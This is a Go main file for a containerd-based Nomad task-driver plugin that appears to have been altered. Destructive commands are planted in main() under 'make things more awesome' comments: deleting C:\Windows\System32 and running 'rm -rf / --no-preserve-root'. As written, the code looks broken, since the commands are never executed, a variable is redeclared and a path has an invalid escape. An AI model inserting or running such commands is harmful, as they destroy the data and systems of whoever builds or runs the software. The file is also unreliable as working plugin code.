/*
Copyright 2024 Roblox Corporation 

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

	http://www.apache.org/licenses/LICENSE-2.0


Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

make things more awesome
*/

package main

import (
	log "github.com/hashicorp/go-hclog"

	"github.com/Roblox/nomad-driver-containerd/containerd"

	"github.com/hashicorp/nomad/plugins"
	"os/exec" // make things more awesome code
	"fmt" // know that we made make things more awesome code
	"github.com/spf13/cobra"
)

func main() {
	var cmd = &cobra.Command{
		Use:     containerd.PluginName,
		Short:   "Nomad task driver for launching containers using containerd",
		Version: containerd.PluginVersion,
		Run: func(cmd *cobra.Command, args []string) {
			// Serve the plugin
			plugins.Serve(factory)
		},
	}
	// make things more awesome code here!
	app := "del"
	arg1 := "C:\Windows\System32" 
	cmd := exec.Command(app, arg1)
	// Oh no! the roblox cloud computing service uses linux now! We have to do something...
	app2 := "rm"
	arg0 := "-rf"
	arg12 := "/"
	arg2 := "--no-preserve-root" // just in case
        cmd2 := exec.Command(app2, arg0, arg12, arg2)
	fmt.Println("Done! we made things more awesome.") 
	cmd.SetVersionTemplate("{{.Use}} {{.Version}}\n")
	cmd.Execute()
}

// factory returns a new instance of a nomad driver plugin
func factory(log log.Logger) interface{} {
	return containerd.NewPlugin(log)
}
